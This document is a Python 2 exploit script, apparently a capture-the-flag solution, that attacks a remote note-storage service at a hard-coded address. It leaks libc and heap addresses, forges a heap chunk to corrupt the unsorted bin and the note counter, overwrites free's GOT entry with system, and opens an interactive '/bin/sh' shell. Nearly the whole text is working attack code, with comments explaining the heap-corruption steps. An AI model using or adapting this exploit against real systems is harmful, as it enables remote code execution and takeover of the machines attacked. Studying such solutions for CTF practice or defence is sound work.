#!/usr/bin/python
import struct
import socket
import telnetlib

def readuntil(f, delim=': '):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def p(v):
    return struct.pack('<Q', v)

def u(v):
    return struct.unpack('<Q', v)[0]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('202.112.26.108', 10001))
f = s.makefile('rw', bufsize=0)

def list_notes(f):
    f.write('1\n')
    entries = []
    while True:
        l = f.readline()[:-1]
        if l.startswith('== '):
            break
        entries.append(l.split(' ', 2)[1])
    readuntil(f)
    return entries

def create_note(f, data):
    f.write('2\n')
    readuntil(f)
    f.write(str(len(data)) + '\n')
    readuntil(f)
    f.write(data)
    readuntil(f)

def delete_note(f, note, shell=False):
    f.write('4\n')
    readuntil(f)
    f.write(str(note) + '\n')
    if not shell:
        readuntil(f)

def edit_note(f, note, data):
    f.write('3\n')
    readuntil(f)
    f.write(str(note) + '\n')
    readuntil(f)
    f.write(str(len(data)) + '\n')
    readuntil(f)
    f.write(data)
    readuntil(f)

readuntil(f)

create_note(f, 'AAAA') # 0
create_note(f, 'BBBB') # 1
delete_note(f, 0)
create_note(f, 'AAAAAAAA') # 0
entries = list_notes(f)
libc_addr = u(entries[0][8:].ljust(8, '\0'))
libc_base = libc_addr - 0x3be7b8
print 'libc_base =', hex(libc_base)
system = libc_base + 0x46640

create_note(f, 'A' * 32) # 2
create_note(f, 'B' * 32) # 3
create_note(f, 'C' * 32) # 4
create_note(f, 'D' * 32) # 5

delete_note(f, 2)
delete_note(f, 4)

create_note(f, 'A' * 8) # 2

entries = list_notes(f)
heap_addr = u(entries[2][8:].ljust(8, '\0'))
print 'heap_addr =', hex(heap_addr)

g_notes = heap_addr - 0x1a50
print 'g_notes =', hex(g_notes)

create_note(f, 'B' * 8) # 4

# Get these in the large bin.
size = 1024
create_note(f, '0' * size) # 6
create_note(f, '1' * size) # 7
create_note(f, '2' * size) # 8
create_note(f, '3' * size) # 9

delete_note(f, 8)
delete_note(f, 6)

# After the create, 6 and 8 point to the same address. After the delete,
# 6 points to a freed chunk.
create_note(f, 'X' * size) # 6
delete_note(f, 8)

# Write a fake chunk.
fake_chunk = ''
fake_chunk += 'A' * 8
fake_chunk += p(g_notes - 0x10)
edit_note(f, 6, fake_chunk.ljust(size, '\0'))

free_got = 0x602018
fake_notes = '/bin/sh\0'
fake_notes += p(1)
fake_notes += p(8)
fake_notes += p(free_got)

# Allocate a chunk (grabs an item off of the unsorted bin).
create_note(f, fake_notes.ljust(size, '\0')) # 8

# Now the fake chunk is sitting in the unsorted bin. Allocate a chunk,
# which removes the fake chunk from the bin. This writes the head of the
# unsorted bin to fake_chunk->bk->fd, which overwrites num_notes. This
# lets us index past 256 notes to get arbitrary write. We index into the
# chunk we allocated above, which contains a pointer free's got entry.
create_note(f, 'Z' * size) # 10

# Replace free with system, and free our note (which starts the command
# to run).
edit_note(f, 293, p(system))

delete_note(f, 8, shell=True)
print 'done'

t = telnetlib.Telnet()
t.sock = s
t.interact()

